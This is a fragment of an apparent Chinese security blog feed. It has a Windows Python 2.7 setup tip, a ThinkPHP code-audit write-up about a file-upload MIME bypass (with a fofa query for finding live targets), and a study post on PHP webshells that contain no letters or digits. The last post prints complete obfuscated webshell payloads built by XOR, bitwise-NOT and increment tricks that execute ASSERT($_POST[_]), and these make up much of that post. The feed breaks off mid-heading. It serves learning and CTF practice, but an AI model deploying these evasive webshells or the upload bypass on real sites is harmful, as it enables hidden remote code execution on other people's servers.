        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="Windows设置自定义环境变量"><a href="#Windows设置自定义环境变量" class="headerlink" title="Windows设置自定义环境变量"></a>Windows设置自定义环境变量</h1><p><code>GitHack.py</code>的语法基于<code>python2.7</code>版本，不想在<code>kali</code>上操作，<code>Windows</code>本机上运行试试：</p><p><img src="/./../images/posts/windows%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/image-20240808111659844.png" alt="image-20240808111659844"></p><p>这是为什么呢？因为<code>python3.12</code>的语法与<code>python.2,7</code>的有冲突，而我设置的<code>python</code>环境变量是<code>python3.12</code>：</p><p><img src="/./../images/posts/windows%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/image-20240808111800734.png" alt="image-20240808111800734"></p><p>如果想运行<code>python2.7</code>，有三个方法：</p><h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a><strong>方法一</strong></h2><p>将<code>python</code>的环境变量改成<code>python2.7</code>，因为旧版本的局限性所以没必要这么做，我就不展示了。</p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a><strong>方法二</strong></h2><p>使用绝对路径调用<code>python2.7</code>，如图：</p><p><img src="/./../images/posts/windows%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/image-20240808112129894.png" alt="image-20240808112129894"></p><p>但是这样仍然麻烦，有没有一劳永逸的方法，可以使两个版本的python环境变量不冲突？有，方法三。</p><h2 id="方法三"><a href="#方法三" class="headerlink" title="方法三"></a><strong>方法三</strong></h2><ol><li><p><code>win+r</code>打开<code>cmd</code>，输入 <code>notepad</code>并回车</p></li><li><p>此时会跳出一个记事本，写下：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">E:\python2.7\python.exe %*</span><br></pre></td></tr></table></figure><p>保存为<code>python2.7.bat</code>，保存目录选择： <code>C:\Windows</code></p><ol start="3"><li>如果上一步选择了 <code>C:\Windows</code>，那么在环境变量中配置 <code>C:\Windows</code>即可（可能有些人已经配置了，直接用即可）。</li></ol><p>最终结果：</p><p><img src="/./../images/posts/windows%E8%AE%BE%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/image-20240808112718270.png" alt="image-20240808112718270"></p><p>本文以配置<code>python2.7</code>为例，但是我们可以举一反三，配置其他各种环境变量，这样也不会与原来的环境变量起冲突。</p>]]></content>
      
      
      <categories>
          
          <category> SSRF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二次代码审计</title>
      <link href="/2024/08/07/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2024/08/07/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="第二次代码审计"><a href="#第二次代码审计" class="headerlink" title="第二次代码审计"></a>第二次代码审计</h1><p>本次审计的提示是<strong>文件上传</strong>。</p><h2 id="工作结构"><a href="#工作结构" class="headerlink" title="工作结构"></a>工作结构</h2><p><code>ThinkPHP</code>的框架结构已经熟悉，在<code>/app</code>下的目录结构如图：<br><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240807181321285.png" alt="image-20240807181321285"></p><p>常规服务的工作目录是哪个呢？不妨登录网页看看：</p><p>（<code>fofa</code>语句：<code>&quot;web/static/css/chunk-elementUI.f92cd1c5.css&quot;</code>）</p><p><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240807181602133.png" alt="image-20240807181602133"></p><p>猜测是<code>web</code>目录下，对照源码证实猜想。</p><h2 id="寻找入口"><a href="#寻找入口" class="headerlink" title="寻找入口"></a>寻找入口</h2><p><code>ThinkPHP</code>自带的文件上传方法，本次就使用<code>request()-&gt;file()</code>：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/add27ad1bcb3a00f8ecfe059d0ae2b83.png" alt="add27ad1bcb3a00f8ecfe059d0ae2b83"></p><p>我们不可能一个一个文件寻找，使用全局搜索：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240807182055916.png" alt="image-20240807182055916"></p><p>只有<code>Video.php</code>的检测不严格，可以<code>MIME</code>绕过：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240807182235297.png" alt="image-20240807182235297"></p><h2 id="实现上传"><a href="#实现上传" class="headerlink" title="实现上传"></a>实现上传</h2><p>想要上传，需要满足几点：</p><ol><li>知道启动方法的路径</li><li>是POST方法，并且可以上传文件</li><li>开启相关配置</li></ol><p>对于第一点，我猜测路径是<code>/web/video/uploadMedia</code>，但是实际上是<code>/web.php/video/uploadMedia</code>，我发现这一点是在头像上传的请求包里：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240807182918440.png" alt="image-20240807182918440"></p><p>原理是什么呢：</p><blockquote><p>在ThinkPHP中，<code>web.php</code> 是应用的入口文件。访问路径中的 <code>web.php</code> 部分实际是对入口文件的引用，这是因为服务器配置了URL重写，将所有请求导向入口文件（如 <code>web.php</code>），以便框架可以处理它们。</p></blockquote><p>在上图的基础上可以完成第二点。</p><p>至于第三点，请看下图：</p><p><img src="/./../images/posts/%E7%AC%AC%E4%BA%8C%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/image-20240807185220805.png" alt="image-20240807185220805"></p><p>这是因为<code>Fileinfo</code> 扩展未启用，<code>finfo_open()</code> 是 <code>PHP Fileinfo</code> 扩展的一部分。如果该扩展未启用，会导致函数未定义的错误。</p><h2 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h2><p>本次的思路非常清晰：</p><ol><li>从框架等入手推出相应的危险方法</li><li>全局搜索使用对应危险方法的源码</li><li>找到可利用的点，实现攻击</li></ol><p>每一次审计的项目体量都不小，所以我们需要熟知对应框架有哪些危险方法等等，有根据地去寻找可利用的点。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ThinkPHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无字母webshell学习</title>
      <link href="/2024/08/05/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/08/05/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本篇文章学习P神的两篇文章：</p><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></li><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></li></ul><h1 id="0x01-第一道题目"><a href="#0x01-第一道题目" class="headerlink" title="0x01 第一道题目"></a>0x01 第一道题目</h1><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell | 离别歌 (leavesongs.com)</a></li></ul><h2 id="问题-·-禁用"><a href="#问题-·-禁用" class="headerlink" title="问题 · 禁用"></a>问题 · 禁用</h2><p>问：<strong>如何编写一个不使用数字和字母的webshell</strong>，具现为如下代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思路-·-变换"><a href="#思路-·-变换" class="headerlink" title="思路 · 变换"></a>思路 · 变换</h2><p>题目的<code>if</code>语句和<code>eval</code>语句不仅有先后关系，还具有功能上的差异：<code>if</code>语句不能把<code>shell</code>的内容当做<code>PHP</code>代码执行，但是<code>eval</code>可以。这点差异是本文方法的基础。</p><p>本节方法的核心在于<strong>字符变换</strong>。如果我们的<code>payload</code>本身不具有字母和数字，但是在<code>eval</code>里可以变换成危险的字母和数字，那么就可以<code>webshell</code>。</p><p>P神文章主要使用<code>PHP5</code>的<code>assert()</code>，本文也一样。下面引用P神原文：</p><blockquote><p>不过在此之前，我需要说说php5和7的差异。</p><p>php5中assert是一个函数，我们可以通过<code>$f=&#39;assert&#39;;$f(...);</code>这样的方法来动态执行任意代码。</p><p>但php7中，assert不再是函数，变成了一个语言结构（类似eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用file_put_contents函数，同样可以用来getshell。</p><p>下文为了方便起见，使用PHP5作为环境，PHP7相关的利用方法自己探索吧。</p></blockquote><p>本人使用<code>PHPstudy_pro</code>的<code>php5.5.9nts</code>。</p><h2 id="法一-·-异或"><a href="#法一-·-异或" class="headerlink" title="法一 · 异或"></a>法一 · 异或</h2><p><em>读者可以先去了解<code>PHP</code>的异或机制</em></p><p>在<code>PHP</code>中，两个字符异或后得到一个字符。如下：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805103011379.png" alt="image-20240805103011379"></p><p>我们可以通过选择一些不可见字符和符号异或出特定的字符，再拼接成攻击语句。P神给出了一个示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $_=&#x27;assert&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%01&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%13&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%05&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%12&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%14&#x27;</span>^<span class="string">&#x27;`&#x27;</span>); </span><br><span class="line"><span class="comment">// $__=&#x27;_POST&#x27;;</span></span><br><span class="line"><span class="variable">$__</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%0D&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%2F&#x27;</span>^<span class="string">&#x27;`&#x27;</span>).(<span class="string">&#x27;%0E&#x27;</span>^<span class="string">&#x27;]&#x27;</span>).(<span class="string">&#x27;%09&#x27;</span>^<span class="string">&#x27;]&#x27;</span>); </span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$$__</span>;</span><br><span class="line"> <span class="comment">// assert($_POST[_]);</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[_]);</span><br></pre></td></tr></table></figure><blockquote><p>因为其中存在很多不可打印字符，所以我用url编码表示了</p></blockquote><p>执行结果如下：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805150403875.png" alt="image-20240805150403875"></p><p>大家有没有想过一个问题：为什么这里一定要用<code>assert()</code>，或者不能把<code>assert()</code>换成<code>eval()</code>？</p><p>这是因为<code>payload</code>前面的部分构造了<code>$_POST[_]</code>，但是这仅仅只是字符串而不能发挥功能，所以要想办法把这个字符串当做<code>PHP</code>代码执行。<code>eval()</code>虽然可以实现这个功能，但是<code>eval()</code>本身不是函数而是语言结构，所以通过字符串拼接<code>eval()</code>没有意义。但是<code>assert()</code>在<code>PHP5</code>（可能更高的版本也一样）是函数，可以通过字符串并执行<code>$_POST[_]</code>。</p><h2 id="法二-·-取反"><a href="#法二-·-取反" class="headerlink" title="法二 · 取反"></a>法二 · 取反</h2><p>与法一思路一致，都是通过字符变换实现<code>webshell</code>。不过这里采用取反的思想，并且在<code>Hackbar</code>上要手动编码一次。</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805153545656.png" alt="image-20240805153545656"></p><p>给出代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$__</span>=(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>)+(<span class="string">&#x27;&gt;&#x27;</span>&gt;<span class="string">&#x27;&lt;&#x27;</span>);</span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$__</span>/<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;和&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;的&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;半&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;始&quot;</span>;<span class="variable">$____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_____</span>=<span class="string">&#x27;_&#x27;</span>;<span class="variable">$___</span>=<span class="string">&quot;俯&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;瞰&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$__</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;次&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);<span class="variable">$___</span>=<span class="string">&quot;站&quot;</span>;<span class="variable">$_____</span>.=~(<span class="variable">$___</span>&#123;<span class="variable">$_</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$_____</span>;</span><br><span class="line"><span class="variable">$____</span>(<span class="variable">$_</span>[<span class="variable">$__</span>]);</span><br></pre></td></tr></table></figure><h2 id="法三-·-递增"><a href="#法三-·-递增" class="headerlink" title="法三 · 递增"></a>法三 · 递增</h2><p><code>PHP</code>的<code>++</code>运算符效果如下（<code>--</code>运算符不具有）：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805155057013.png" alt="image-20240805155057013"></p><p>如果具有<code>a</code>字符和<code>A</code>字符，我们便可以构造出所有字母。因为<code>PHP</code>函数是大小写不敏感的，所以我们执行<code>ASSERT($_POST[_])</code>即可，便省去了获取小写<code>a</code>。</p><p>怎么获取<code>A</code>字符呢？在<code>PHP</code>中，若强制连接数组和字符串，数组会被转换成字符串，其值为<code>Array</code>。如下图：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805160232810.png" alt="image-20240805160232810"></p><p>但是这样仍然不够简单。思考深入一点，只要把数组当做字符串执行，数组就会被转换成字符串<code>Array</code>。看下图：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805160735999.png" alt="image-20240805160735999"></p><p>通过上面的技巧，我们可以构造出所有大写字符。再通过字符拼接，我们可以得到<code>ASSERT($_POST[_]);</code>字符串。具体的<code>webshell</code>P神已经写好了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[];</span><br><span class="line"><span class="variable">$_</span>=@<span class="string">&quot;<span class="subst">$_</span>&quot;</span>; <span class="comment">// $_=&#x27;Array&#x27;;</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;!&#x27;</span>==<span class="string">&#x27;@&#x27;</span>]; <span class="comment">// $_=$_[0];</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>; <span class="comment">// A</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;</span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// E </span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// R</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$___</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$____</span>=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// P</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// O</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// S</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;</span><br><span class="line"><span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++;<span class="variable">$__</span>++; <span class="comment">// T</span></span><br><span class="line"><span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$___</span>(<span class="variable">$_</span>[_]); <span class="comment">// ASSERT($_POST[_]);</span></span><br></pre></td></tr></table></figure><p>结果如下图：</p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805161423796.png" alt="image-20240805161423796"></p><h2 id="小结-·-感悟"><a href="#小结-·-感悟" class="headerlink" title="小结 · 感悟"></a>小结 · 感悟</h2><p>本题三法的核心都是变换。这其实基于一个简单的逻辑：</p><p><code>webshell</code>代码在执行时必须要字母和数字，虽然这些被禁用了，但是因为<code>webshell</code>核心语句在<strong>PHP环境里且执行前</strong>是可控的，那么我们可以在这个空档期进行变换，从而得到<code>webshell</code>的核心语句并顺利在<code>PHP</code>环境下执行。</p><p>上述的时期<strong>：PHP环境里且执行<code>webshell</code>核心语句前</strong>，这个时期其实就是下面代码的<code>A,B,C···</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>（<span class="string">&#x27;A,B,C···core statement&#x27;</span>）</span><br></pre></td></tr></table></figure><p>本题最大的感悟就是思路要放开，而思路放开的基础就是想到问题的本质。我浅析一下本题：</p><blockquote><p>题目在<code>eval()</code>前进行过滤，那我们就得在<code>eval()</code>里得到正常的<code>webshell</code>语句并执行。<code>eval()</code>允许多语句（几个分号的事情），这就为我们得到正常的<code>webshell</code>语句提供了很大的操作空间。至此，我们的问题就是如何得到正常的<code>webshell</code>语句，对此本题的三个方法都有讲述。至此问题解决。</p></blockquote><p>就这么简单吗？有时并非如此。如果服务端检测到这么多的符号熵值，还是会怀疑。</p><h2 id="评论-·-优质"><a href="#评论-·-优质" class="headerlink" title="评论 · 优质"></a>评论 · 优质</h2><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805165529781.png" alt="image-20240805165529781"></p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805165601374.png" alt="image-20240805165601374"></p><p><img src="/./../images/posts/%E6%97%A0%E5%AD%97%E6%AF%8Dwebshell%E5%AD%A6%E4%B9%A0/image-20240805165627135.png" alt="image-20240805165627135"></p><h1 id="0x02-第二道题目"><a href="#0x02-第二道题目" class="headerlink" title="0x02 第二道题目"></a>0x02 第二道题目</h1><ul><li><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">无字母数字webshell之提高篇 | 离别歌 (leavesongs.com)</a></li></ul><h2 id="问题-·-升级"><a href="#问题-·-升级" class="headerlink" title="问题 · 升级"></a>问题 · 升级</h2><p>问题如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上题相比，这题不仅限制了<code>$</code>、<code>_</code>，还限制了<code>payload</code>的长度。</p><h2 id="PHP7-·-轻松解决"><a href="#PHP7-·-轻松解决" class="headerlink" title="PHP7 · 轻松解决"></a>PHP7 · 